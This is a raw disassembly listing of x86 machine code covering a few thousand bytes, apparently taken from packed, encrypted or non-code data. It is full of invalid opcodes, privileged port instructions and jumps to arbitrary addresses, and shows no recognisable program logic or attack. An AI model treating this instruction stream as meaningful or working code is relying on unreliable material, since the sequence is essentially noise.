  4350df:	scas   al,BYTE PTR es:[edi]
  4350e0:	nop
  4350e1:	xor    edi,DWORD PTR [ecx-0x79]
  4350e4:	pop    ss
  4350e5:	mov    ecx,0x339d9924
  4350ea:	xor    BYTE PTR [ebx],bl
  4350ec:	mov    ds:0xf224b8d1,eax
  4350f1:	lds    edi,FWORD PTR [edi+0x14]
  4350f4:	and    eax,0x8af48ea5
  4350f9:	out    0x15,al
  4350fb:	lea    ebp,ds:0x78eeb199
  435101:	dec    esp
  435102:	jmp    0x37dd:0x4e38601d
  435109:	ins    BYTE PTR es:[edi],dx
  43510a:	push   cs
  43510b:	mov    ecx,0x586cdd16
  435110:	xchg   ebp,eax
  435111:	push   ecx
  435112:	ja     0x43513e
  435114:	add    BYTE PTR [esi],dl
  435116:	mov    eax,0x39a6451c
  43511b:	hlt    
  43511c:	out    0x5e,eax
  43511e:	lahf   
  43511f:	dec    esp
  435120:	pop    ds
  435121:	mov    DWORD PTR [esi+eax*1],ebp
  435124:	inc    ebp
  435125:	mov    edi,0xa297ff27
  43512a:	sbb    eax,DWORD PTR [ebx-0x79c64aee]
  435130:	pop    edx
  435131:	out    0xd6,eax
  435133:	mov    ds:0x54b3146e,al
  435138:	mov    dl,0xa3
  43513a:	adc    BYTE PTR [esi+0x35],ch
  43513d:	(bad)  
  43513e:	adc    dh,bl
  435140:	mov    esp,0x2f462f47
  435145:	mov    DWORD PTR [eax-0x5c],ecx
  435148:	aaa    
  435149:	sbb    DWORD PTR [esi-0x52],0x24298865
  435150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435151:	cmp    al,0x2d
  435153:	jmp    0x7925:0x32b38323
  43515a:	xlat   BYTE PTR ds:[ebx]
  43515b:	rcr    edi,0x68
  43515e:	jp     0x4350e0
  435160:	in     eax,0x75
  435162:	int    0xdd
  435164:	jecxz  0x43510c
  435166:	pop    ss
  435167:	mov    edx,0x9d838c93
  43516c:	sbb    ch,BYTE PTR [ecx-0xf]
  43516f:	pop    ss
  435170:	popa   
  435171:	pop    eax
  435172:	(bad)  
  435173:	mov    DWORD PTR [edx],0x21c67ba1
  435179:	loop   0x435192
  43517b:	push   cs
  43517c:	pop    ebp
  43517d:	or     dh,bh
  43517f:	mov    ds:0x34bb9156,al
  435184:	cwde   
  435185:	xchg   edx,esp
  435187:	int3   
  435188:	add    eax,0xdff326d
  43518d:	pop    esp
  43518e:	jg     0x435147
  435190:	cmc    
  435191:	push   esi
  435192:	xchg   ecx,eax
  435193:	jae    0x4351bf
  435195:	pop    edx
  435196:	jne    0x43516d
  435198:	test   eax,0x1a66ab9b
  43519d:	lea    eax,[ebx+edx*1-0x1b74ee70]
  4351a4:	sbb    cl,bh
  4351a6:	repnz xchg ebx,eax
  4351a8:	pop    ebp
  4351a9:	scas   eax,DWORD PTR es:[edi]
  4351aa:	rol    BYTE PTR [ebx],0x93
  4351ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4351ae:	pop    ebx
  4351af:	leave  
  4351b0:	test   DWORD PTR ds:0x94efb82,ebp
  4351b6:	jae    0x4351e4
  4351b8:	mov    ?,WORD PTR [ecx-0x4aacbcca]
  4351be:	rcl    BYTE PTR [edi],1
  4351c0:	push   ebx
  4351c1:	adc    dh,BYTE PTR [edx-0x221c1a2f]
  4351c7:	repnz add eax,DWORD PTR [ebx+0x491983a1]
  4351ce:	lea    edi,[ecx+ebp*8+0x17c96b07]
  4351d5:	(bad)  
  4351d6:	in     al,dx
  4351d7:	idiv   DWORD PTR [ebx+0x52657570]
  4351dd:	fnstcw WORD PTR [edi-0x2816dd70]
  4351e3:	adc    ecx,ebx
  4351e5:	mov    dl,BYTE PTR [eax-0x4429a65b]
  4351eb:	jne    0x4351c2
  4351ed:	jmp    0x4351ab
  4351ef:	dec    esp
  4351f0:	fwait
  4351f1:	rcl    DWORD PTR ds:0xe2b034fe,cl
  4351f7:	stos   DWORD PTR es:[edi],eax
  4351f8:	mov    cl,bh
  4351fa:	adc    DWORD PTR [esi+eax*1],ebx
  4351fd:	in     al,dx
  4351fe:	mov    dh,0x55
  435200:	cmp    ebp,edx
  435202:	mov    ch,0x89
  435204:	fwait
  435205:	inc    esi
  435206:	push   esi
  435207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435208:	test   BYTE PTR [ebx+edi*4],cl
  43520b:	inc    esp
  43520c:	lea    edi,ds:[eax-0x4ebed125]
  435213:	test   BYTE PTR [edi+0x45],ah
  435216:	push   ss
  435217:	lea    edx,[ebp+0x66]
  43521a:	cmp    ah,bh
  43521c:	mov    BYTE PTR [edx+0x391d22a1],cl
  435222:	mov    ebx,0x76c53375
  435227:	cmp    edi,edi
  435229:	call   0x9649:0xc4208b1b
  435230:	sti    
  435231:	jmp    0x9bd0e152
  435236:	mov    esi,0x7732e0b4
  43523b:	adc    DWORD PTR [ebp-0x65190f3a],esi
  435241:	push   eax
  435242:	ss fdivr st,st(1)
  435245:	xchg   edi,eax
  435246:	rcl    DWORD PTR [edx-0x6b],0x19
  43524a:	adc    ah,BYTE PTR [edi+0x29]
  43524d:	push   eax
  43524e:	mov    edx,0xd8f4b24
  435253:	lods   al,BYTE PTR ds:[esi]
  435254:	jmp    0xe73a79fe
  435259:	mov    esp,0x920de57
  43525e:	imul   edx,DWORD PTR ds:0x2a100aef,0x3aea9a9d
  435268:	dec    ebp
  435269:	sahf   
  43526a:	or     eax,DWORD PTR [ecx]
  43526c:	call   0xb2cc:0xb340f1f6
  435273:	shl    BYTE PTR [esi-0x220b4418],1
  435279:	fs dec ebx
  43527b:	inc    ebp
  43527c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43527d:	pop    ebp
  43527e:	xchg   esi,eax
  43527f:	retf   0x60a
  435282:	xchg   edi,eax
  435283:	not    al
  435285:	int    0xb8
  435287:	not    BYTE PTR [esi]
  435289:	(bad)  
  43528b:	call   0x425a:0x83ff532f
  435292:	mov    dh,ah
  435294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435295:	sbb    edi,DWORD PTR [edi]
  435297:	sbb    eax,0x379b296f
  43529c:	inc    ebp
  43529d:	dec    esi
  43529e:	mov    al,0x2
  4352a0:	cmp    DWORD PTR [edi],esi
  4352a2:	mov    bh,0x4
  4352a4:	sbb    BYTE PTR ds:0x2ea5ab32,al
  4352aa:	xchg   esi,eax
  4352ab:	out    0x5,al
  4352ad:	lods   eax,DWORD PTR ds:[esi]
  4352ae:	inc    esi
  4352af:	lods   al,BYTE PTR ds:[esi]
  4352b0:	pushf  
  4352b1:	cmp    BYTE PTR [ecx+0x36fc41d],cl
  4352b7:	cmc    
  4352b8:	mov    edi,0x1f58f7a7
  4352bd:	clc    
  4352be:	ret    0x7e67
  4352c1:	lock lds ebx,FWORD PTR cs:[esi]
  4352c5:	jno    0x435291
  4352c7:	fwait
  4352c8:	xchg   esp,eax
  4352c9:	mov    ds:0x3052acb,eax
  4352ce:	and    dh,bh
  4352d0:	into   
  4352d1:	push   edx
  4352d2:	add    BYTE PTR [ebp+edx*4+0x5f],ah
  4352d6:	mov    esi,0x9df53cc4
  4352db:	adc    BYTE PTR [ebp-0x61],dh
  4352de:	pop    ebx
  4352df:	mov    WORD PTR [edi+eiz*8],fs
  4352e2:	arpl   WORD PTR [esp+ecx*1],si
  4352e5:	mov    al,ds:0xd45eae5e
  4352ea:	mov    ebp,0x27596264
  4352ef:	out    0x2d,eax
  4352f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4352f2:	sti    
  4352f3:	jecxz  0x4352f5
  4352f5:	pop    esi
  4352f6:	mul    BYTE PTR [edi+0x21]
  4352f9:	xchg   ebp,eax
  4352fa:	add    ch,BYTE PTR [eax+0x6]
  4352fd:	(bad)  [esi-0x5c879bcc]
  435303:	sbb    BYTE PTR [ebp-0x7e],dh
  435306:	in     eax,0xe6
  435308:	enter  0xc03c,0x97
  43530c:	or     DWORD PTR [edx-0x17],ebp
  43530f:	jo     0x435377
  435311:	adc    dl,BYTE PTR [eax-0x2e16e5ce]
  435317:	stos   DWORD PTR es:[edi],eax
  435318:	xchg   ebp,eax
  435319:	mov    al,ds:0x4f5599ab
  43531e:	call   0x39f375b1
  435323:	adc    al,0x56
  435325:	or     bh,BYTE PTR [eax+0x5afda854]
  43532b:	inc    edi
  43532c:	in     al,0x68
  43532e:	add    BYTE PTR [ebp+esi*1+0x43e517c0],0xb4
  435336:	into   
  435337:	xor    DWORD PTR [edx],esp
  435339:	cdq    
  43533a:	ins    DWORD PTR es:[edi],dx
  43533b:	xchg   ecx,eax
  43533c:	sti    
  43533d:	xchg   ebx,eax
  43533e:	retf   0xadec
  435341:	push   cs
  435342:	int3   
  435343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435344:	cmp    eax,0x76273395
  435349:	cmp    BYTE PTR [edi+0x31bcfaf3],dl
  43534f:	jmp    DWORD PTR [ebp+0x6e81d3b]
  435355:	jnp    0x43536f
  435357:	std    
  435358:	xchg   ebp,eax
  435359:	out    0xf1,ax
  43535c:	jmp    0x11450801
  435361:	sbb    al,BYTE PTR [ecx+0x63]
  435364:	out    0xa1,eax
  435366:	das    
  435367:	mov    edi,0x5753187c
  43536c:	pop    ebx
  43536d:	and    cl,cl
  43536f:	push   0x40
  435371:	pop    esi
  435372:	in     al,dx
  435373:	mov    ah,0xa1
  435375:	ret    0xd96f
  435378:	and    bl,BYTE PTR [ecx]
  43537a:	icebp  
  43537b:	arpl   WORD PTR [si-0x38],dx
  43537f:	push   eax
  435380:	outs   dx,BYTE PTR ds:[esi]
  435381:	and    ebp,DWORD PTR ds:0x7aa37f43
  435387:	pop    ss
  435388:	add    ecx,DWORD PTR [ebx-0x7adb0206]
  43538e:	cdq    
  43538f:	cs xchg ecx,eax
  435391:	push   edx
  435392:	(bad)  
  435393:	adc    eax,0xed207825
  435398:	push   0xd68048c1
  43539d:	into   
  43539e:	mov    bl,al
  4353a0:	in     eax,0x40
  4353a2:	test   eax,0xae9804ef
  4353a7:	and    BYTE PTR [ecx-0x5f],al
  4353aa:	clc    
  4353ab:	inc    eax
  4353ac:	sbb    edi,edi
  4353ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4353af:	popa   
  4353b0:	sbb    ch,BYTE PTR [ecx]
  4353b2:	add    BYTE PTR [edi],bl
  4353b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4353b5:	jmp    0x435382
  4353b7:	mov    ah,0x35
  4353b9:	pushf  
  4353ba:	fstp   TBYTE PTR [eax-0x46]
  4353bd:	pop    ebx
  4353be:	inc    esi
  4353bf:	cmp    ecx,DWORD PTR [ecx+eiz*4]
  4353c2:	jge    0x4353ba
  4353c4:	mov    al,0xc5
  4353c6:	mov    dl,0x94
  4353c8:	iret   
  4353c9:	jne    0x4353c1
  4353cb:	adc    BYTE PTR [ebp-0x11],dl
  4353ce:	pop    esi
  4353cf:	cli    
  4353d0:	mov    ah,0x6c
  4353d2:	mov    ah,BYTE PTR [ebp+0x63]
  4353d5:	dec    esi
  4353d6:	jae    0x43544b
  4353d8:	jl     0x4353ed
  4353da:	mov    dl,0xe4
  4353dc:	mov    esp,0xf9c48d6f
  4353e1:	xor    eax,0xca35a2c2
  4353e6:	push   0xffffffec
  4353e8:	push   esp
  4353e9:	inc    ebx
  4353ea:	(bad)  
  4353eb:	std    
  4353ec:	and    ecx,ebp
  4353ee:	xchg   ebx,eax
  4353ef:	das    
  4353f0:	(bad)  
  4353f1:	loope  0x4353a8
  4353f3:	jae    0x435382
  4353f5:	mov    eax,ds:0xbab49a3b
  4353fa:	mov    ah,0x19
  4353fc:	xor    al,0x25
  4353fe:	clc    
  4353ff:	mov    bl,0x4a
  435401:	mov    edx,0x641924b9
  435406:	js     0x4353f2
  435408:	lea    esp,[esi+0xf3364fb]
  43540e:	stos   BYTE PTR es:[edi],al
  43540f:	mov    al,0xbd
  435411:	frstor [esi+0x2d]
  435414:	mov    al,ds:0x5454b399
  435419:	rcl    DWORD PTR [ecx],0x6d
  43541c:	cmc    
  43541d:	or     eax,0x5ed7f360
  435422:	jo     0x4353c5
  435424:	sbb    DWORD PTR [ecx+0x6b],ebx
  435427:	xchg   edx,eax
  435428:	xor    al,0xde
  43542a:	pop    ebx
  43542b:	loop   0x435455
  43542d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43542e:	dec    ebx
  43542f:	in     al,0xee
  435431:	fisub  DWORD PTR ds:[edi-0x392bd007]
  435438:	not    BYTE PTR [eax-0x5a41fabd]
  43543e:	pop    edi
  43543f:	leave  
  435440:	fisttp DWORD PTR ds:0x2e55658f
  435446:	mov    al,0xf3
  435448:	sub    eax,0x91f93c8c
  43544d:	fiadd  DWORD PTR [esi+0x2a91ff0]
  435453:	test   eax,0xcb2a0046
  435458:	jne    0x4353f5
  43545a:	lods   eax,DWORD PTR ds:[esi]
  43545b:	jmp    0x43540f
  43545d:	mov    ch,0x35
  43545f:	ins    BYTE PTR es:[edi],dx
  435460:	cli    
  435461:	sub    al,0x6
  435463:	loopne 0x435422
  435465:	sbb    DWORD PTR [eax+ebp*8+0x21],0x7d
  43546a:	scas   eax,DWORD PTR es:[edi]
  43546b:	inc    ebp
  43546c:	mov    bl,BYTE PTR [ecx+ecx*1-0x34730c35]
  435473:	adc    eax,DWORD PTR [esi]
  435475:	out    dx,al
  435476:	out    dx,al
  435477:	fsubrp st(7),st
  435479:	std    
  43547a:	enter  0x54e7,0x67
  43547e:	cmp    eax,0x957bce91
  435483:	repnz push ebp
  435485:	xor    cl,al
  435487:	call   0xe928296
  43548c:	and    eax,0xb6433a39
  435491:	fcomp  st(0)
  435493:	repz add ah,BYTE PTR [edx+0x49f9c71b]
  43549a:	or     DWORD PTR [ebx-0x4b639e8f],0x66
  4354a1:	push   ds
  4354a2:	mov    ebx,0x236e374
  4354a7:	push   ds
  4354a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4354a9:	popf   
  4354aa:	(bad)  
  4354ab:	in     al,0xed
  4354ad:	mov    ebx,0xf91b96ec
  4354b2:	mov    es,WORD PTR [ebp-0x5bf998b6]
  4354b8:	xor    ah,BYTE PTR [ebp+0x1817dd8b]
  4354be:	mov    eax,0xa089e1be
  4354c3:	xor    al,0x88
  4354c5:	lea    ebx,[eax+ebx*8+0x4bba0c3a]
  4354cc:	xchg   DWORD PTR [edi+ebp*4-0x20615f7d],edx
  4354d3:	add    ah,ah
  4354d5:	mov    eax,ds:0x900671cb
  4354da:	enter  0xcb48,0xb8
  4354de:	sahf   
  4354df:	mov    dl,0x27
  4354e1:	add    BYTE PTR ds:0x3cb0c02c,dl
  4354e7:	test   BYTE PTR [ebp+eiz*1-0x62],cl
  4354eb:	lds    ebx,FWORD PTR [ebp-0x80]
  4354ee:	cs repnz xchg esi,eax
  4354f1:	mov    ds:0x95df505b,eax
  4354f6:	inc    eax
  4354f7:	add    BYTE PTR [eax],cl
  4354f9:	pop    edi
  4354fa:	cmp    eax,0x8db89333
  4354ff:	xor    ebx,DWORD PTR [ebx]
  435501:	fwait
  435502:	mov    edx,0x552abdc4
  435507:	call   DWORD PTR [ebp+0x46e4edc6]
  43550d:	test   DWORD PTR [ebx],0x69291602
  435513:	inc    ebx
  435514:	mov    ds:0xa8c9dda2,eax
  435519:	call   0xbc0:0x91d2671b
  435520:	out    dx,al
  435521:	cmp    dh,ch
  435523:	icebp  
  435524:	and    BYTE PTR [edi],dl
  435526:	cmp    BYTE PTR [ecx+ebp*1],dl
  435529:	hlt    
  43552a:	mov    ecx,0xb7c31104
  43552f:	stc    
  435530:	sahf   
  435531:	pop    esp
  435532:	mov    ebp,ecx
  435534:	mov    ch,0x64
  435536:	cdq    
  435537:	repnz cmp BYTE PTR [edi],ah
  43553a:	jb     0x4354d4
  43553c:	test   al,0x59
  43553e:	arpl   WORD PTR [ecx],cx
  435540:	cli    
  435541:	icebp  
  435542:	dec    ebx
  435543:	dec    ecx
  435544:	and    cl,ah
  435546:	fucomp st(0)
  435548:	cmp    al,0xa4
  43554a:	fwait
  43554b:	mov    ch,0x79
  43554d:	mov    esp,0x30e1e84c
  435552:	test   eax,0xbe94d28c
  435557:	test   DWORD PTR fs:[edi+edx*4+0x1f9c35fc],eax
  43555f:	in     al,dx
  435560:	in     al,dx
  435561:	call   0x5ca7:0xc018e12e
  435568:	out    0x9a,eax
  43556a:	jnp    0x435536
  43556c:	adc    BYTE PTR [edi-0x645f1ecd],bl
  435572:	jnp    0x4355ed
  435574:	mov    ecx,0x3645a2cd
  435579:	jae    0x4355ee
  43557b:	out    dx,al
  43557c:	push   ss
  43557d:	fldenv [eax-0x44]
  435580:	test   al,0x87
  435582:	or     DWORD PTR ds:0xf69ba4ed,esp
  435588:	mov    ebx,0xc8665397
  43558d:	xor    cl,BYTE PTR [ebx-0x39f125b1]
  435593:	xchg   esp,eax
  435594:	xchg   ebx,eax
  435595:	test   BYTE PTR [ebp-0x1d],ch
  435598:	and    BYTE PTR [edx-0x6b936f05],ah
  43559e:	lods   eax,DWORD PTR ds:[esi]
  43559f:	cwde   
  4355a0:	out    0x65,eax
  4355a2:	pop    esp
  4355a3:	mov    ch,BYTE PTR [eax]
  4355a5:	pop    es
  4355a6:	mov    esp,0x95517884
  4355ab:	pop    esi
  4355ac:	pop    esp
  4355ad:	xor    bl,BYTE PTR [ebp+edi*8+0x57]
  4355b1:	sub    bl,cl
  4355b3:	leave  
  4355b4:	xchg   edi,eax
  4355b5:	dec    esp
  4355b6:	mov    bl,0x4c
  4355b8:	and    ebp,DWORD PTR [ecx+0x2f]
  4355bb:	data16 jecxz 0x43556f
  4355be:	jl     0x435577
  4355c0:	lods   al,BYTE PTR ds:[esi]
  4355c1:	mov    ds:0x4bb135ab,eax
  4355c6:	hlt    
  4355c7:	and    al,0x8d
  4355c9:	in     al,0xcc
  4355cb:	hlt    
  4355cc:	fst    DWORD PTR [eax+esi*4+0x44]
  4355d0:	dec    esi
  4355d1:	jmp    0x2da9ac9c
  4355d6:	sbb    BYTE PTR [esi+0x3cd4b134],dl
  4355dc:	(bad)  
  4355dd:	xchg   edi,eax
  4355de:	imul   ecx,DWORD PTR [ebx-0x1],0xffffffe4
  4355e2:	mov    ebp,0xced28faf
  4355e7:	les    ecx,FWORD PTR [eax+0x65]
  4355ea:	jae    0x435664
  4355ec:	mov    ?,WORD PTR [ebx+0x65]
  4355ef:	repz dec ecx
  4355f1:	xor    edx,DWORD PTR [ebp-0x4f039d43]
  4355f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4355f8:	sub    eax,0x24f90c04
  4355fd:	cdq    
  4355fe:	mov    edx,0x81bff7df
  435603:	cmp    ah,BYTE PTR [edx]
  435605:	sahf   
  435606:	imul   esp,DWORD PTR [ecx],0xffffffba
  435609:	ret    0xa1b5
  43560c:	xlat   BYTE PTR ds:[ebx]
  43560d:	inc    esi
  43560e:	jmp    0x435635
  435610:	aam    0x9b
  435612:	aad    0x65
  435614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435615:	jp     0x4355d5
  435617:	adc    al,0x95
  435619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43561a:	mov    ebp,DWORD PTR [edx-0x779aff35]
  435620:	mov    eax,ds:0x1dbd7b0d
  435625:	imul   edx,edx,0xa032ca1b
  43562b:	and    eax,0x904ba173
  435630:	iret   
  435631:	mov    ecx,0xa6090011
  435636:	ret    
  435637:	xchg   ebp,eax
  435638:	ror    ah,0xb3
  43563b:	aam    0xd4
  43563d:	mov    ebp,0xc2651d48
  435642:	imul   esi,edx,0x31
  435645:	iret   
  435646:	adc    eax,0x41802009
  43564b:	dec    ecx
  43564c:	shl    BYTE PTR [edi-0x40],0x74
  435650:	or     ebx,DWORD PTR [esi+0x3f]
  435653:	cmp    eax,0xb43a1e1f
  435658:	and    eax,0xbe8faf3
  43565d:	add    DWORD PTR [ebp-0x1be6e08f],edi
  435663:	aam    0x1c
  435665:	pushf  
  435666:	lods   eax,DWORD PTR ds:[esi]
  435667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435668:	cmp    al,0x97
  43566a:	lods   eax,DWORD PTR ds:[esi]
  43566b:	enter  0xa509,0xa3
  43566f:	pop    edi
  435670:	dec    edi
  435671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435672:	pusha  
  435673:	and    BYTE PTR [edx+0x2543474d],0x4b
  43567a:	ins    BYTE PTR es:[edi],dx
  43567b:	out    0x8d,eax
  43567d:	fidiv  WORD PTR [edx]
  43567f:	repnz push ss
  435681:	sub    ah,BYTE PTR [edx+ecx*1-0x22]
  435685:	fidivr WORD PTR [eax+0x17]
  435688:	adc    al,0xf2
  43568a:	mov    ebp,0xa4f21710
  43568f:	inc    ebp
  435690:	jmp    0xba2ce679
  435695:	mov    ecx,DWORD PTR [ebp-0x5065472e]
  43569b:	pushf  
  43569c:	push   edx
  43569d:	jg     0x4356dd
  43569f:	pop    ebx
  4356a0:	dec    esp
  4356a1:	or     DWORD PTR [ebp+ebp*4+0x75],edx
  4356a5:	into   
  4356a6:	mov    al,ds:0xed1dd420
  4356ab:	gs push ebp
  4356ad:	pop    ebp
  4356ae:	jge    0x43569f
  4356b0:	cwde   
  4356b1:	and    DWORD PTR [ebx-0x29],ebx
  4356b4:	mov    eax,0xa7b11bd8
  4356b9:	cmp    eax,0x7b11b599
  4356be:	shl    ecx,cl
  4356c0:	mov    al,0x9e
  4356c2:	(bad)  
  4356c4:	xor    al,0x2
  4356c6:	fs cmp al,0xdb
  4356c9:	pop    ss
  4356ca:	aaa    
  4356cb:	push   eax
  4356cc:	mov    edi,edi
  4356ce:	mov    dl,0xe4
  4356d0:	mov    al,ds:0x75e33620
  4356d5:	outs   dx,DWORD PTR ds:[esi]
  4356d6:	or     dh,dl
  4356d8:	add    edx,edx
  4356da:	out    dx,eax
  4356db:	sahf   
  4356dc:	sub    eax,0x5b2141b9
  4356e1:	mov    ebp,0xd7e0c590
  4356e6:	push   cs
  4356e7:	xor    DWORD PTR [ebp+0x4aeb919e],0x16
  4356ee:	in     eax,0x79
  4356f0:	sbb    DWORD PTR [ecx],edi
  4356f2:	mov    ah,0x12
  4356f4:	mov    eax,0x66b5c2b
  4356f9:	pushf  
  4356fa:	jmp    0x435712
  4356fc:	in     al,0xad
  4356fe:	xor    BYTE PTR [ebx],cl
  435700:	xor    bh,0xcd
  435703:	jmp    0x671b:0xf52fe560
  43570a:	sub    edi,ecx
  43570c:	sub    eax,0xf683d2b7
  435711:	cmp    BYTE PTR [esi],bl
  435713:	add    dl,BYTE PTR [esi-0x1b19f71b]
  435719:	cmp    al,0x26
  43571b:	daa    
  43571c:	sbb    bh,BYTE PTR [esi]
  43571e:	mov    edi,0x39b8cdb4
  435723:	dec    ecx
  435724:	in     eax,0xaa
  435726:	shr    dh,0xde
  435729:	fucomp st(1)
  43572b:	out    dx,al
  43572c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43572d:	jle    0x4356d3
  43572f:	or     eax,0xe348b49d
  435734:	push   ds
  435735:	mov    DWORD PTR [ebp+0x58b8ee9b],esi
  43573b:	aas    
  43573c:	jns    0x4356e8
  43573e:	sbb    ebp,DWORD PTR [ebx-0x164f1373]
  435744:	mov    WORD PTR [edx-0x5],fs
  435747:	shl    DWORD PTR ds:0x677bc799,1
  43574d:	stos   DWORD PTR es:[edi],eax
  43574e:	test   edx,esp
  435750:	mov    ds:0x45b45f40,al
  435755:	test   al,0x2b
  435757:	pushf  
  435758:	mov    gs,WORD PTR [eax+0x16]
  43575b:	cli    
  43575c:	(bad)
  435760:	(bad)  
  435761:	xchg   esi,eax
  435762:	mov    ah,0xf4
  435764:	comiss xmm5,DWORD PTR [esi]
  435767:	xchg   edx,eax
  435768:	in     al,0x9f
  43576a:	sub    ecx,DWORD PTR [eax]
  43576c:	fisubr WORD PTR [ecx-0x38]
  43576f:	xchg   esp,eax
  435770:	test   eax,0xd6171186
  435775:	gs xchg ebp,eax
  435777:	push   esi
  435778:	mov    dh,bl
  43577a:	add    eax,0xba6bf141
  43577f:	jo     0x435707
  435781:	pusha  
  435782:	and    al,0x22
  435784:	in     eax,0x10
  435786:	inc    edi
  435787:	aas    
  435788:	add    eax,0x7c03586
  43578d:	sbb    bl,BYTE PTR [ebp+0x188108d4]
  435793:	inc    esp
  435794:	push   es
  435795:	fs dec edx
  435797:	arpl   bp,cx
  435799:	fwait
  43579a:	in     al,0x99
  43579c:	mov    dh,0x7b
  43579e:	sub    al,0xc5
  4357a0:	cwde   
  4357a1:	mov    edx,0xeb3cb224
  4357a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4357a7:	pop    ds
  4357a8:	and    eax,0x20e138e5
  4357ad:	jmp    0xeaefcc5
  4357b2:	or     BYTE PTR [eax+0x19],0x83
  4357b6:	outs   dx,DWORD PTR ds:[esi]
  4357b7:	aad    0xc8
  4357b9:	test   al,0xcb
  4357bb:	dec    eax
  4357bc:	retf   
  4357bd:	jl     0x435807
  4357bf:	mov    esp,0x507212f0
  4357c4:	ror    ebx,0xb8
  4357c7:	fs rcl ebp,cl
  4357ca:	(bad)  
  4357cb:	clc    
  4357cc:	out    0x34,al
  4357ce:	aaa    
  4357cf:	pop    edx
  4357d0:	dec    ecx
  4357d1:	or     esi,ebx
  4357d3:	mov    eax,ds:0xed003bf9
  4357d8:	inc    ebp
  4357d9:	jo     0x4357ea
  4357db:	les    ecx,FWORD PTR [edi+0x4e78a48c]
  4357e1:	lahf   
  4357e2:	cmp    eax,0x42670f30
  4357e7:	fcomp  QWORD PTR [eax]
  4357e9:	and    eax,0x4e1652e6
  4357ee:	repz into 
  4357f0:	and    eax,0x743162e9
  4357f5:	sub    DWORD PTR [ecx],esp
  4357f7:	or     DWORD PTR [ecx-0x78],edx
  4357fa:	mov    eax,0xf020ffb4
  4357ff:	gs xchg ebp,eax
  435801:	dec    ebx
  435802:	out    dx,eax
  435803:	jmp    0x791c:0xe14d468c
  43580a:	add    DWORD PTR [edi+0x3d143a53],eax
  435810:	imul   esp,DWORD PTR [edx+0x1d],0xf606133a
  435817:	test   DWORD PTR ds:0xbfecf51d,edx
  43581d:	or     dl,BYTE PTR [edx]
  43581f:	popa   
  435820:	ja     0x435864
  435822:	mov    bh,0xd4
  435824:	pop    ebx
  435825:	repz in eax,0x71
  435828:	push   ebp
  435829:	ficomp WORD PTR [ebx]
  43582b:	out    0x34,eax
  43582d:	js     0x4357fa
  43582f:	mov    eax,0x7aaac925
  435834:	int3   
  435835:	ins    DWORD PTR es:[edi],dx
  435836:	mul    BYTE PTR [ecx]
  435838:	jne    0x4357c1
  43583a:	jge    0x4358a0
  43583c:	add    eax,0xf0274f9e
  435841:	in     eax,dx
  435842:	pop    ss
  435843:	loop   0x4358c1
  435845:	test   DWORD PTR [esi+0x60],0x5676cd0b
  43584c:	jg     0x435885
  43584e:	mov    ecx,0x9bb53550
  435853:	add    dh,BYTE PTR [ecx]
  435855:	std    
  435856:	fisubr DWORD PTR [ebp+0x1]
  435859:	mov    eax,0x5e42573d
  43585e:	retf   0xaf2
  435861:	icebp  
  435862:	mov    ch,0x74
  435864:	in     eax,dx
  435865:	mov    cl,0x88
  435867:	lahf   
  435868:	mov    ch,0xc8
  43586a:	loope  0x43585e
  43586c:	bnd jbe 0x4358a9
  43586f:	cmp    bl,BYTE PTR [ecx+edi*4]
  435872:	jmp    0xb2cfe0a7
  435877:	pop    edi
  435878:	int    0xa8
  43587a:	xchg   edi,eax
  43587b:	or     cl,BYTE PTR [ebx]
  43587d:	fstp   TBYTE PTR [eax+0x4c95e8f]
  435883:	(bad)  [eax]
  435885:	addr16 arpl di,si
  435888:	(bad)  
  435889:	sbb    ecx,ebp
  43588b:	nop
  43588c:	push   edi
  43588d:	popf   
  43588e:	imul   ebp,esp,0x1
  435891:	ss pop bx
  435894:	outs   dx,BYTE PTR ds:[esi]
  435895:	mov    ebx,0xf87bbb01
  43589a:	mov    ah,0x14
  43589c:	add    eax,0xf62210e4
  4358a1:	jl     0x435830
  4358a3:	ficomp DWORD PTR [esi]
  4358a5:	adc    esi,DWORD PTR [esi]
  4358a7:	je     0x4358f3
  4358a9:	pop    esp
  4358aa:	dec    eax
  4358ab:	mov    ah,0x2c
  4358ad:	jp     0x435872
  4358af:	les    esp,FWORD PTR [edi-0x76985ecd]
  4358b5:	pop    ecx
  4358b6:	ds hlt 
  4358b8:	data16 lahf 
  4358ba:	imul   ebp,DWORD PTR [edx],0x1
  4358bd:	(bad)  
  4358be:	retf   0x1aa9
  4358c1:	or     DWORD PTR [ecx+0x5f],edx
  4358c4:	test   al,0x6d
  4358c6:	outs   dx,BYTE PTR ds:[esi]
  4358c7:	sbb    al,0x7c
  4358c9:	pushf  
  4358ca:	imul   edi,DWORD PTR [ecx+0x3b54e5d1],0xffffffab
  4358d1:	mov    eax,ds:0x69f3b613
  4358d6:	(bad)  
  4358d7:	lock in eax,0xb0
  4358da:	(bad)  
  4358db:	out    0xc9,al
  4358dd:	daa    
  4358de:	(bad)  
  4358df:	out    0x57,eax
  4358e1:	sub    al,dl
  4358e3:	das    
  4358e4:	mov    BYTE PTR [ecx+0x7a261843],bh
  4358ea:	push   esp
  4358eb:	ret    0x7291
  4358ee:	dec    esi
  4358ef:	lock add eax,0xd3e9bf15
  4358f5:	dec    edx
  4358f6:	add    cl,0x1b
  4358f9:	pop    ecx
  4358fa:	inc    ebx
  4358fb:	dec    esi
  4358fc:	lock daa 
  4358fe:	stc    
  4358ff:	(bad)  
  435900:	js     0x43596e
  435902:	iret   
  435903:	out    0x1d,al
  435905:	jns    0x435914
